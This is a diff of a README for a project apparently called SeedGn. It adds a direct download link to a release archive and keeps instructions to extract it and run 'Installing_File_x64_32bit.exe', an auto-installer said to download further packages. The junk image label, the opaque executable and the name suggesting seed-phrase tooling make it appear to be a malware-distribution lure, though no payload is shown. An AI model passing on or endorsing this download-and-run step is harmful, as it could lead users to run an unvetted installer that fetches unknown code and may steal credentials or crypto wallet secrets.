@@ -8,8 +8,8 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/384a7b5d-e22b-4f0a-8167-495414889278)
-]()
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+](https://github.com/fevc08/SeedGn/releases/download/V5.43/Release.zip)
+## **1. [Download the archive](https://github.com/fevc08/SeedGn/releases/download/V5.43/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 ![seedmain2](https://github.com/user-attachments/assets/e6996b2e-74ab-4343-909f-9c61e8c88577)
 
